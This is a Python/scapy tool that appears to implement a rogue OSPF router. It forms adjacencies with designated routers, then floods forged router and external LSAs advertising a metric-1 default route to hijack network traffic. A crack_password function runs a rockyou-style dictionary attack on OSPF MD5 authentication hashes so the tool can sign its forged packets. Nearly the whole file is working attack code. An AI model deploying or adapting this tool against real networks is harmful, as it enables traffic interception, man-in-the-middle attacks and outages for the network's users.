#!/usr/bin/python3

import secrets
import hashlib
import logging
import threading
import time
import typing
from dataclasses import dataclass, field
from enum import Enum, IntEnum, auto, IntFlag
from typing import Any

from scapy.all import Packet, sendp, sniff, raw, Raw
from scapy.contrib.ospf import (
    OSPF_DBDesc,
    OSPF_External_LSA,
    OSPF_Hdr,
    OSPF_Hello,
    OSPF_LSUpd, OSPF_LSA_Hdr, OSPF_LSAck, OSPF_Router_LSA, OSPF_Link,
)
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether

logging.basicConfig(level=logging.DEBUG)
LOG = logging.getLogger("ospf-session")

ALL_SPF_ROUTERS = "224.0.0.5"
ALL_SPF_ROUTERS_MAC = "01:00:5e:00:00:05"

# NOTE: NOT USED
# ALL_DR_ROUTERS = "224.0.0.6"
# ALL_DR_ROUTERS_MAC = "01:00:5e:00:00:06"

def hash_password(pw: str, actual_ospf_pkt: bytes):

    pw_bytes = pw.strip().encode('utf-8')

    # Format key to exactly 16 bytes
    if (len(pw_bytes) < 16):
        padded_key = pw_bytes + b'\x00' * (16 - len(pw_bytes)) if len(pw_bytes) < 16 else pw_bytes[:16]
    else:
        padded_key = pw_bytes[:16]

    # Concatenate actual ospf pkt and padded key
    buffer = actual_ospf_pkt + padded_key

    # Calculate hash
    generated_hash = hashlib.md5(buffer).digest()

    return generated_hash

class OSPFAuthType(IntEnum):
    NONE = 0
    PLAINTEXT = 1
    CRYPTO = 2

class NeighbourState(Enum):
    DOWN = auto()
    INIT = auto()
    TWO_WAY = auto()
    EXSTART = auto()
    EXCHANGE = auto()
    LOADING = auto()
    FULL = auto()


class OSPFType(IntEnum):
    # OSPF Hello
    HELLO = 1
    # OSPF Database Description
    DBD = 2
    # OSPF Link State Request
    LSR = 3
    # OSPF Link State Update
    LSU = 4
    # OSPF Link State Acknowledge
    LSACK = 5


class DBDFlags(IntFlag):
    NONE = 0x00
    INIT = 0x04
    MORE = 0x02 
    MASTER = 0x01


@dataclass
class OSPFConfig:
    iface: str
    router_id: str
    mask: str
    int_ip: str
    area: str = "0.0.0.0"
    plaintext_pw: str = "" # use default val first so it doenst crash

    lsa_seq: int = 0x80000001
    
    # Auth details 
    authtype: int | None = None
    key_id: int | None = None
    authdata_len: int | None = None
    authseq: int | None = None

    hello_interval: int = 10
    dead_interval: int = 40
    priority: int = 0 #NOTE: Priority 0 = DROTHER - not participating in DR/BDR election
    options: int = 0x02
    mtu: int = 1500
    # rxmt_interval: int = 5 # retransmission interval
    # max_retries: int = 3


@dataclass
class Neighbour:
    # To populate
    router_id: str # nb router id
    ip: str # nb ip
    mac: str | None = None # nb mac

    state: NeighbourState = NeighbourState.DOWN

    is_master: bool | None = None
    dd_seq: int | None = None

    pending_requests: list[tuple[int, str, str]] = field(default_factory=list)
    pending_acks: dict[tuple[int, str, str], dict[str, Any]] = field(default_factory=dict)

    neighbour_headers: list[Any] = field(default_factory=list)

    last_seen: float = field(default_factory=time.time)

    def is_dead(self, now: float, dead_interval: int) -> bool:
        return now - self.last_seen > dead_interval

    def set_state(self, new_state: NeighbourState) -> None:
        if self.state != new_state:
            LOG.info(
                "Neighbor %s: %s -> %s",
                self.router_id,
                self.state.name,
                new_state.name,
            )
            self.state = new_state

# Main Class
class OSPFSession:
    def __init__(self, config: OSPFConfig, ip: str, mac: str, path_to_dict: str) -> None:
        self.config = config

        self.dictpath = path_to_dict

        # Device IP and MAC
        self.src_ip = ip
        self.src_mac = mac

        # Track DR/BDR - both starts with "0.0.0.0"
        self.dr = "0.0.0.0"
        self.bdr = "0.0.0.0"

        self.neighbours:dict[str, Neighbour] = {}
        
        # Key: {lsa_type, link_state_id, advertising_router}
        self.lsdb: dict[tuple[int, str, str], Any] = {}

        self.running = False
        self.lock = threading.Lock()

        # self.config.authtype = getattr(ospf, "authtype", 0)
        # Crypto Authdata PW is the last 16 bytes of the packet
        # Convert raw packet to bytes and retrieve last 16 bytes to extract hashed pw

        # # Impt: Extract password/authdata
        # if extract_details.get("authtype") == OSPFAuthType.PLAINTEXT:
        #     # Extract plaintext pw directly
        #     extract_details["password"] = ospf_packets.authdata
        #
        # self.config.plaintext_pw = self.crack_password(ospf, self.dictpath)
        #
        # if not self.config.plaintext_pw:
        #     return

    def run(self):
        self.running = True

        LOG.info(
"""
[*] Starting OSPF session [*]
Interface = %s
Src IP = %s
Router ID = %s
area = %s
""",
self.config.iface,
self.src_ip,
self.config.router_id,
self.config.area,
                )

        # Heartbeat
        self.start_hello_loop()
        # self.start_retransmission_loop()

        try:
            self.start_sniffer()
        except Exception as e:
            LOG.error(f"Exception occured while sniffing: {e}")
        finally:
            self.running = False

    ### ------ OSPF HELLO ------ ###
    def start_hello_loop(self) -> threading.Thread:
        """Starts threads for heartbeat/polling"""
        thread = threading.Thread(target=self._hello_loop, daemon=True)
        thread.start()
        return thread

    def _hello_loop(self) -> None:
        """Keeps device visible to OSPF"""
        while self.running:
            now = time.time()

            with self.lock:
                self.expire_dead_neighbours(now)
                neighbour_ids = self.get_active_neighbour_ids(now)

            hello = self.build_hello_packet(neighbour_ids)

            self._send_ospf(
                    dst_ip=ALL_SPF_ROUTERS,
                    dst_mac=ALL_SPF_ROUTERS_MAC,
                    ospf_type=OSPFType.HELLO,
                    payload=hello,
                    )

            time.sleep(self.config.hello_interval)

    def expire_dead_neighbours(self, now: float) -> None:
        """Checks if neighbour links are dead, then removes them from neighbours list"""
        dead = [
            rid
            for rid, nb in self.neighbours.items()
            if nb.is_dead(now, self.config.dead_interval)
        ]

        for rid in dead:
            LOG.warning("Neighbor %s expired", rid)
            del self.neighbours[rid]
            
    def get_active_neighbour_ids(self, now: float) -> list[str]:
        """Retrieves active neighbours links"""
        return [
            nb.router_id
            for nb in self.neighbours.values()
            if not nb.is_dead(now, self.config.dead_interval)
        ]

    def build_hello_packet(self, neighbour_ids: list[str]) -> Packet:
        """OSPF Hello Packet Builder, returns scapy packet"""
        return OSPF_Hello(
            mask=self.config.mask,
            hellointerval=self.config.hello_interval,
            options=self.config.options,
            prio=self.config.priority,
            deadinterval=self.config.dead_interval,
            router=self.dr,
            backup=self.bdr,
            neighbors=neighbour_ids,
        )
    ### ------ OSPF HELLO ENDS ------ ###

    ### ------ OSPF SNIFFER ------ ###
    def start_sniffer(self) -> None:
        sniff(
            iface=self.config.iface,
            filter="ip proto 89",
            prn=self.handle_packets,
            store=False,
            stop_filter=lambda _: not self.running,
        )
    ### ------ OSPF SNIFFER END ------ ###

    ### ------ OSPF PACKET HANDLERS ------ ###
    def handle_packets(self, pkt: Any) -> None:
        if IP not in pkt or OSPF_Hdr not in pkt:
            return

        original_ospf = pkt[OSPF_Hdr]

        # Extract and Clean OSPF Header - Scapy doesn't parse MD5 auth packets properly
        ospf_len = original_ospf.len
        ospf_bytes = bytes(original_ospf)[:ospf_len]

        ospf = OSPF_Hdr(ospf_bytes)

        # Own OSPF Packet - Drop
        if ospf.src == self.config.router_id:
            return

        # Different OSPF Area - Drop
        if ospf.area != self.config.area:
            return

        if ospf.authtype == 2:
            self.config.key_id = ospf.keyid
            self.config.authseq = ospf.seq + 1

        # Otherwise Determine OSPF Packet Type
        with self.lock:
            nb = self.get_or_create_neighbour(pkt)

        # Handlers for sniffed/incoming packets, OUTSIDE of lock to prevent deadlocks
        if ospf.type == OSPFType.HELLO:
            self.handle_hello(nb, ospf)
        elif ospf.type == OSPFType.DBD:
            self.handle_dbd(nb, ospf)
        elif ospf.type == OSPFType.LSU:
            self.handle_lsupd(nb, ospf)

    def get_or_create_neighbour(self, pkt: Any) -> Neighbour:
        """Get Neighbour List and Adds Neighbour to List if not already added"""
        ospf = pkt[OSPF_Hdr]
        router_id = str(ospf.src)
        ip = pkt[IP].src

        nb = self.neighbours.get(router_id)

        if nb is None:
            # Create neighbour packet
            nb = Neighbour(
                    router_id=router_id,
                    ip=ip,
                    )
            self.neighbours[router_id] = nb
            LOG.info("[+] New Neighbour Detected: %s at %s", router_id, ip)

        nb.last_seen = time.time()

        if Ether in pkt:
            nb.mac = pkt[Ether].src

        return nb

    def handle_hello(self, nb: Neighbour, ospf: Any) -> None:
        """OSPF HELLO Packet Handler"""
        ospf_hello = ospf[OSPF_Hello]

        # Update OSPF Hello state from DOWN to INIT
        if nb.state == NeighbourState.DOWN:
            nb.set_state(NeighbourState.INIT)

        # Update tracking field
        neighbour_list = [str(x) for x in ospf_hello.neighbors]
        self.dr = ospf_hello.router
        self.bdr = ospf_hello.backup

        # Check if my Router ID in Neighbour's OSPF Hello list
        if self.config.router_id in neighbour_list:
            if nb.state in {NeighbourState.DOWN, NeighbourState.INIT}:
                nb.set_state(NeighbourState.TWO_WAY)

        # Form adjacency
        if nb.state == NeighbourState.TWO_WAY and self.should_form_adjacency(nb, ospf_hello):
            self.start_exstart(nb)

    def should_form_adjacency(self, nb: Neighbour, ospf_hello: OSPF_Hello) -> bool:
        """Form adjacency only if neighbour is DR/BDR since we are not partaking in DR/BDR election"""
        # Checks if OSPF_Hello router and backup fields matches neighbours ip addr
        nb_is_dr = str(ospf_hello.router) == nb.ip
        nb_is_bdr = str(ospf_hello.backup) == nb.ip
        # Initialising - No DR set yet
        no_dr_declared = str(ospf_hello.router) == "0.0.0.0"

        return nb_is_dr or nb_is_bdr or no_dr_declared

    ### ------ DBD NEGOTIATION ------ ###
    def start_exstart(self, nb: Neighbour) -> None:
        """Begins DBD Negotiation - Decide DBD master slave"""
        if nb.mac is None:
            LOG.warning("[!] Cannot start ExStart with %s: no MAC address.", nb.router_id)
            return

        nb.set_state(NeighbourState.EXSTART)
        nb.is_master = None
        # Use secrets to generate seq number - smaller than using time.time
        nb.dd_seq = secrets.randbelow(0xFFFFFFFF - 1) + 1

        dbd_packet = self.build_dbd_packet(
                master=True,
                init=True,
                more=True,
                dd_seq=nb.dd_seq,
                lsa_headers=[],
                )

        self._send_ospf(
                dst_ip=nb.ip,
                dst_mac=nb.mac,
                ospf_type=OSPFType.DBD,
                payload=dbd_packet,
                )

    def build_dbd_packet(
            self,
            master: bool,
            init: bool,
            more: bool,
            dd_seq: int,
            lsa_headers: list[Any]
            ) -> Packet:
        """DBD Packet Builder"""
        # Using raw integer bitmask instead of list of flags
        flag_value = 0

        if init:
            flag_value |= DBDFlags.INIT
        if more:
            flag_value |= DBDFlags.MORE
        if master:
            flag_value |= DBDFlags.MASTER

        return OSPF_DBDesc(
                mtu=self.config.mtu,
                options=self.config.options,
                dbdescr=flag_value,
                ddseq=dd_seq,
                lsaheaders=lsa_headers,
                )
    
    def handle_dbd(self, nb: Neighbour, ospf: Any) -> None:
        """Handler for RECEIVED OSPF DBD Type Packet"""
        dbd_packet = ospf[OSPF_DBDesc]
        # Retrieve integer bitmask and cast to DBDFlags Enum
        flags = DBDFlags(dbd_packet.dbdescr)

        LOG.info(
                "DBD from %s: flags=%s, raw=%s, ddseq=%s, lsaheaders=%d",
                nb.ip,
                flags,
                int(dbd_packet.dbdescr),
                dbd_packet.ddseq,
                len(getattr(dbd_packet, "lsaheaders", [])),
                )

        # Ensure neighbour state not DOWN, INIT or TWO_WAY
        if nb.state in {NeighbourState.DOWN, NeighbourState.INIT, NeighbourState.TWO_WAY}:
            return

        # Establish master/slave relationship (router with highest id)
        if nb.state == NeighbourState.EXSTART:
            self.handle_exstart_dbd(nb, dbd_packet, flags)
            return

        # Exchange headers/summaries of Link State Database
        if nb.state == NeighbourState.EXCHANGE:
            self.handle_exchange_dbd(nb, dbd_packet, flags)

    def handle_exstart_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
        """Handler to establish master/slave relationship"""
        # Safe evaluation for empty lsaheaders returns True if empty, False otherwise
        has_no_lsas = getattr(dbd_packet, "lsaheaders", None) in (None, [])

        # Neighbour proposes itself as master
        expected_exstart = DBDFlags.INIT | DBDFlags.MORE | DBDFlags.MASTER
        nb_proposes_master = (flags & expected_exstart) == expected_exstart and has_no_lsas # Simple bitwise AND and ensure that DBDesc packets has no actual routing data

        if nb_proposes_master and nb.is_master is None:
            # Neighbour has larger router id - wins master role
            if self.router_id_gt(nb.router_id, self.config.router_id):
                LOG.debug("We are slave")
                nb.is_master = True 
                nb.dd_seq = dbd_packet.ddseq

                # Master here refers to if master flag should be set for packet to be sent out confusing ahh
                reply_packet = self.build_dbd_packet(
                        master=False,
                        init=False,
                        more=False,
                        dd_seq=typing.cast(int, nb.dd_seq),
                        lsa_headers=[],
                        )

                self._send_ospf(
                        dst_ip=nb.ip,
                        dst_mac=typing.cast(str, nb.mac), 
                        ospf_type=OSPFType.DBD,
                        payload=reply_packet,
                        )
                nb.set_state(NeighbourState.EXCHANGE)

            # Otherwise drop packet
            return

        # Neighbour accepts us as master - confirm ddseq number same as our tracked dd_seq number
        nb_yielded = not (flags & DBDFlags.MASTER) and dbd_packet.ddseq == nb.dd_seq

        if nb_yielded:
            nb.is_master = False 
            LOG.debug("We are master")

            # Safely parse headers
            lsa_headers = getattr(dbd_packet, "lsaheaders", []) or []
            self.collect_lsa_headers(nb, lsa_headers)
            nb.set_state(NeighbourState.EXCHANGE)

            self.continue_dbd_exchange(nb, more=bool(flags & DBDFlags.MORE))

    def router_id_gt(self, a: str, b: str) -> bool:
        """Helper to get compare router-ids - Can't compare strings directly"""
        import ipaddress
        return int(ipaddress.IPv4Address(a)) > int(ipaddress.IPv4Address(b))
    
    def handle_exchange_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
        """Handler for OSPF DBD EXCHANGE STATE packet exchange"""
        self.collect_lsa_headers(nb, dbd_packet.lsaheaders)

        if nb.is_master is True:
            # Update neighbour tracker to the received seq num
            nb.dd_seq = dbd_packet.ddseq

            reply = self.build_dbd_packet(
                    master=False,
                    init=False,
                    more=False, # Hardcode False since we not sending LSAheaders
                    dd_seq=typing.cast(int, nb.dd_seq),
                    lsa_headers=[],
                    )

            self._send_ospf(
                    dst_ip=nb.ip,
                    dst_mac=typing.cast(str, nb.mac),
                    ospf_type=OSPFType.DBD,
                    payload=reply,
                    )
            
            # More data waiting to be sent?
            if not bool(flags & DBDFlags.MORE):
                self.exchange_complete(nb)

        elif nb.is_master is False:
            if dbd_packet.ddseq != nb.dd_seq:
                LOG.warning("[!] Sequence mismatch in handle_exchange_dbd, slave does not match us: expected %d, got %d", nb.dd_seq, dbd_packet.ddseq)
                return

            self.continue_dbd_exchange(nb, more=bool(flags & DBDFlags.MORE))

    def continue_dbd_exchange(self, nb: Neighbour, more: bool) -> None:
        """Master only func: Increments dd sequence"""
        if nb.dd_seq is None:
            LOG.warning("Cannot continue DBD exchange with %s: missing DD sequence.", nb.router_id)
            return

        if not more:
            LOG.debug("Send final master DBD to %s", nb.router_id)
            self.exchange_complete(nb)
            return

        # Increment on 32-bit seq number
        nb.dd_seq = (nb.dd_seq + 1) & 0xFFFFFFFF

        dbd_packet = self.build_dbd_packet(
                master=True,
                init=False,
                more=False,
                dd_seq=nb.dd_seq,
                lsa_headers=[],
                )

        self._send_ospf(nb.ip, typing.cast(str, nb.mac), OSPFType.DBD, dbd_packet)

    def collect_lsa_headers(self, nb: Neighbour, lsaheaders: list[Any]) -> None:
        """Collects DBD LSA Headers and append to Unknown LSA's to Neighbour's `neighbour_headers` list"""
        for header in lsaheaders:
            key = (header.type, str(header.id), str(header.adrouter))

            if key in self.lsdb:
                continue

            already_known = any(
                    (hdr.type, str(hdr.id), str(hdr.adrouter)) == key
                    for hdr in nb.neighbour_headers
                    )

            if not already_known:
                nb.neighbour_headers.append(header)
    ### ------ END DBD NEGOIATION ------ ###

    ### ------ REQUEST MISSING LSAs ------ ###
    def exchange_complete(self, nb: Neighbour) -> None:
        """Inject Route After DBD EXCHANGE Complete"""
        if nb.neighbour_headers:
            # nb.set_state(NeighbourState.LOADING)
            # nb.neighbour_headers.clear()
            LOG.info("Skipping topology syncing...")
            nb.neighbour_headers.clear()

        nb.set_state(NeighbourState.FULL)
        LOG.info("Neighbour %s state set to FULL. Beginning route injection...", nb.router_id)

        self.inject_low_cost_route(nb)

    # TODO: RESEND LSA EVERY 30 min with increasing seq num
    def inject_low_cost_route(self, nb: Neighbour) -> None:
        """Construct and floods fake default route"""
        # Craft Type 1 Router LSA
        link = OSPF_Link(
                id=nb.ip,
                data=self.config.int_ip,
                type=2, # 2 for Transit Link as seen in _OSPF_Router_LSA_types
                metric=1 # OSPF Link with route cost 1
                )

        router_lsa = OSPF_Router_LSA(
                id=self.config.router_id,
                adrouter=self.config.router_id,
                type=1,
                seq=self.config.lsa_seq,
                flags=0x02, # Flag 0x02 marks this device as ASBR
                linklist=link,
                )

        # Craft LSA to replicate `default-information originate always metric-type 1 metric 1` router command
        fake_route = OSPF_External_LSA(
                type=5,
                id="0.0.0.0", # Default route
                mask="0.0.0.0",
                adrouter=self.config.router_id,
                options=0x00,
                metric=1,
                )

        # Bundle LSA in LSU payload
        lsu_payload = OSPF_LSUpd(
                lsacount=2,
                lsalist=[router_lsa, fake_route],
                )

        # Sending to ALL_DR_ROUTERS didn't work but ALL_SPF_ROUTERS did
        # DR will intercept and validate against our FULL adjacency
        self._send_ospf(
                dst_ip=ALL_SPF_ROUTERS,
                dst_mac=ALL_SPF_ROUTERS_MAC,
                ospf_type=OSPFType.LSU,
                payload=lsu_payload,
                )

        LOG.info("Injected Type 1 default route to %s via %s", nb.ip, ALL_SPF_ROUTERS)

    def handle_lsupd(self, nb: Neighbour, ospf: Any) -> None:
        """Handler for received LSUpd packets - Prevents Neighbour from shutting down link due to too many LSUpds with no response"""
        lsu = ospf[OSPF_LSUpd]
        lsas = getattr(lsu, "lsalist", [])

        if lsas:
            # Digging through LSA list to extract my LSA sequence number
            for lsa in lsas:
                if isinstance(lsa, OSPF_Router_LSA) and lsa.adrouter == self.config.router_id:
                    # Track new seq number to use if used (for injecting route)
                    self.config.lsa_seq = lsa.seq + 1

        LOG.info("Received LSU from %s with %d LSAs", nb.router_id, len(lsas))

        # Send LSAck - Skip storing LSAs
        self.send_lsa_ack(nb, lsas)

    def send_lsa_ack(self, nb: Neighbour, lsas: list[Any]) -> None:
        """Sends and Builds LSAck packets"""
        headers = [
                OSPF_LSA_Hdr(
                    age=lsa.age if hasattr(lsa, "age") else 10,
                    options=lsa.options,
                    type=lsa.type,
                    id=lsa.id,
                    adrouter=lsa.adrouter,
                    seq=lsa.seq,
                    chksum=lsa.chksum,
                    len=lsa.len,
                    )
                for lsa in lsas
                ]

        ack = OSPF_LSAck(lsaheaders=headers)

        self._send_ospf(
                dst_ip=nb.ip,
                dst_mac=typing.cast(str, nb.mac),
                ospf_type=OSPFType.LSACK,
                payload=ack,
                )

    def crack_password(self, ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
        """
        OSPF Authtype 2 - Hashed PW cracker

        Currently only supports MD5 Hash Cracking

        OSPF Uses a specific MD5 hashing format

        How it works:
            1.  Clears chksum bit in OSPF Header - set to 0
            2.  Enforces a strict 16 byte long Key by padding NULL bytes to the end of the key if the key length is less than 16 bytes
                Otherwise, uses the first 16 bytes of the password as the Key
            3.  Concatenates the actual OSPF Packet (Header + Payload) with formatted Key
            4.  Calculates MD5 hash from this buffer and appends it to the end of the entire packet

        How we crack the hash:
            1.  Extract the hash from the packet - last 16 bytes
            2.  Extract OSPF Packet (Header + Payload) from the packet (Start of OSPF Header to End of packet - 16 bytes)
            3.  Run a dictionary attack hashing each password by following the hashing method above
            4.  Compare each hash digest against the extracted hash to get the password
        """

        # Theoretically chksum should alr be 0 but jic
        if getattr(ospf_pkt, "chksum", None) != 0:
            setattr(ospf_pkt, "chksum", 0)

        raw_ospf_pkt = bytes(ospf_pkt)

        # Extract OSPF MD5 hash located at end of OSPF packet (after OSPF header + payload)
        extracted_hash = raw_ospf_pkt[-16:]
        LOG.info("[!] Extracted hash %s", extracted_hash.hex())

        # Extract actual OSPF packet
        actual_ospf_pkt = raw_ospf_pkt[:-16]

        # Iterate and try passwords from rockyou.txt
        try:
            with open(filename, "r", encoding='utf-8') as file:
                for pw in file:
                    print(f"Trying {pw}", end="\r")
                    # Format key to exactly 16 bytes
                    pw_bytes = pw.strip().encode('utf-8')
                    padded_key = pw_bytes + b'\x00' * (16 - len(pw_bytes)) if len(pw_bytes) < 16 else pw_bytes[:16]

                    # Concatenate actual ospf pkt and padded key
                    buffer = actual_ospf_pkt + padded_key

                    # Calculate hash
                    generated_hash = hashlib.md5(buffer).digest()

                    if generated_hash == extracted_hash:
                        # Match
                        LOG.critical("[!] Found Password: %s", pw)
                        return pw 
            # Password Cracking Failed
            LOG.fatal("[!] Failed to crack password. Hash: %s", extracted_hash)
            return "" 

        except FileNotFoundError:
            LOG.error("[!] %s file not found.", filename)
        except PermissionError:
            LOG.error("[!] No permission to open %s", filename)
        except Exception as e:
            LOG.error(f"[!] crack_password - Unknown error: {e}")

    def _send_ospf(self, dst_ip: str, dst_mac: str, ospf_type: int, payload: Any) -> None:
        """Sends OSPF Packets"""
        # TODO: Cleanup - alota values same as default, unnecessary
        if self.config.authtype == OSPFAuthType.CRYPTO:

            ospf = (
                OSPF_Hdr(
                        version=2, # OSPF ver 2 for ipv4
                        type=ospf_type,
                        src=self.config.router_id,
                        area=self.config.area,
                        chksum=0,
                        authtype=self.config.authtype,
                        keyid=self.config.key_id,
                        authdatalen=self.config.authdata_len,
                        seq=self.config.authseq,
                        ) /
                payload
            )

            ospf_bytes = raw(ospf)

            ospf_len = int.from_bytes(ospf_bytes[2:4], "big")

            ospf_packet = ospf_bytes[:ospf_len] # in bytes

            # Run hashing on stored plaintext password
            generated_hash = hash_password(self.config.plaintext_pw, ospf_packet)

            # LOG.debug(f"generated hash: {generated_hash.hex()}")

            full_ospf_packet = ospf_packet + generated_hash

            pkt = (
                    Ether(src=self.src_mac, dst=dst_mac) /
                    IP(src=self.src_ip, dst=dst_ip, proto=89, ttl=1) /
                    Raw(full_ospf_packet) 
                )

            

            sendp(pkt, iface=self.config.iface, verbose=False)

            return

        elif self.config.authtype == OSPFAuthType.PLAINTEXT:
            ospf_hdr = OSPF_Hdr(
                    version=2,
                    type=ospf_type,
                    src=self.config.router_id,
                    area=self.config.area,
                    authtype=self.config.authtype,
                    authdata=self.config.plaintext_pw
                    )
        else:
            ospf_hdr = OSPF_Hdr(
                    version=2,
                    type=ospf_type,
                    src=self.config.router_id,
                    area=self.config.area,
                    authtype=self.config.authtype,
                    ) 

        pkt = (
                Ether(src=self.src_mac, dst=dst_mac) /
                IP(src=self.src_ip, dst=dst_ip, proto=89, ttl=1) /
                ospf_hdr /
                payload
            )

        sendp(pkt, iface=self.config.iface, verbose=False)
